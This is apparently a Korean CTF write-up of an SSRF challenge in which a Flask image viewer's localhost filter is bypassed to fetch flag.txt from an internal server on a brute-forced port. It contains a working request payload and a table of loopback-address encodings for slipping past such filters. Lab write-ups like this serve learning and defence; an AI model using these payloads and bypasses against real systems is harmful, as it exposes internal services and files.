---
tier: Silver 2
topics:
  - SSRF
  - Brute Force
solved-with: Writeup
---
### 문제 구조

- `app.py`: `/img_viewer`에서 서버 내부의 이미지 파일을 요청할 수 있음. 
``` python
@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET":
        return render_template("img_viewer.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        urlp = urlparse(url)
        # '/'으로 시작하는 경로인 경우: localhost:8000에 붙임.
        if url[0] == "/":
            url = "http://localhost:8000" + url
        # 호스트 + 도메인이 localhost, 127.0.0.1인 경우: error.png를 반환
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
	        # 서버에서 해당 경로 파일을 가져옴.
            data = requests.get(url, timeout=3).content
            img = base64.b64encode(data).decode("utf8")
        except:
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)
```

- `/staic/`: Flask는 기본적으로 `/static` 경로를 파일을 HTTP로 제공하는 라우트를 열어둠. 
- `flag.txt`: `/static` 파일 밖에 존재하므로, 기본적으로 라우트가 없음. 

- 서버가 시작되면 `127.0.0.1:1500~1800`으로 SimpleHTTPRequestHandler 서버를 하나 엶. 
``` python
local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)
```

### 분석 및 풀이

Flask 서버는 `/static`만 기본적으로 제공하도록 설정이 되어 있으므로 `flag.txt`에 접근이 불가함. 
하지만 SimpleHTTPRequestHandler 서버는 서버의 모든 파일에 접근이 가능한 보안이 약한 서버임. 

따라서 서버 내부에서 SimpleHTTPRequestHandler 서버인 `http://127.0.0.1:1500~1800/flag.txt`로 요청을 보내서 파일에 접근하면 됨. 

1. `127.0.0.1`, `localhost`을 직접 사용하면 `error.png`를 반환하므로 `2130706433`, `Localhost`와 같이 우회를 하면 됨. 
2. 포트번호는 1500~1800 중에서 랜덤값이므로 브루트포스 방식 사용 

``` http
POST /img_viewer HTTP/1.1
...

url=http://2130706433:%s/flag.txt
```


### 시행 착오

SimpleHTTPRequestHandler 서버의 존재를 인식하지 못했고 Flask 서버와 SimpleHTTPRequestHandler 서버의 파일 라우팅 방식의 차이를 몰랐었음.

### 새롭게 배운 점

#### localhost 우회 

| 분류       | URL 예시                     | 원리                       |
| -------- | -------------------------- | ------------------------ |
| 기본 주소    | `http://127.0.0.1:1500`    | 필터에 차단됨                  |
| 기본 호스트명  | `http://localhost:1500`    | 필터에 차단됨                  |
| 10진수 변환  | `http://2130706433:1500`   | IPv4 주소를 하나의 10진수 정수로 표현 |
| 16진수 변환  | `http://0x7f000001:1500`   | IPv4 주소를 16진수로 표현        |
| 8진수 변환   | `http://017700000001:1500` | IPv4 주소를 8진수로 표현         |
| 축약 IP    | `http://127.1:1500`        | 127.0.0.1을 축약해서 표현       |
| 축약 IP    | `http://127.0.1:1500`      | 127.0.0.1을 축약해서 표현       |
| 혼합 표기    | `http://0x7f.0.0.1:1500`   | 16진수와 10진수 혼합            |
| 앞자리 0 추가 | `http://127.0.0.01:1500`   | IP 구성 요소에 0을 추가          |
| 대소문자 변경  | `http://LOCALHOST:1500`    | DNS 호스트명은 대소문자를 구별하지 않음  |
| 대소문자 변경  | `http://LocalHost:1500`    | 필터의 대소문자 구분을 이용          |
#### Flask와 SimpleHTTPRequestHandler 비교

| 구분                  | Flask               | SimpleHTTPRequestHandler |
| ------------------- | ------------------- | ------------------------ |
| 기본 파일 제공 방식         | `/static` 아래의 파일 제공 | 지정된 디렉터리 아래의 파일 제공       |
| `/flag.txt`         | 404 Not Found       | 파일 반환 가능                 |
| `/static/dream.png` | 파일 반환               | 파일 반환                    |

또한 서버를 실행할 때 지정하는 IP는 새로운 IP를 만드는 것이 아니라 컴퓨터에 할당된 IP 중 어떤 주소로 연결 받을지를 선택하는 것임. 
- `127.0.0.1`: Loopback IP. 자기 컴퓨터 내부에서 들어오는 연결만 수신하며, 외부에서는 직접 접근할 수 없음.
- `0.0.0.0`: 모든 IPv4 인터페이스에 바인딩하는 특수 주소. 외부 IP와 Loopback IP를 포함하여 서버에 할당된 모든 IPv4 주소로 들어오는 연결을 수신함.
- (가정: 외부 IP) `1.2.3.4`: 해당 IP로 들어오는 연결만 수신함. 외부에서도 해당 IP로 서버에 접근할 수 있음.


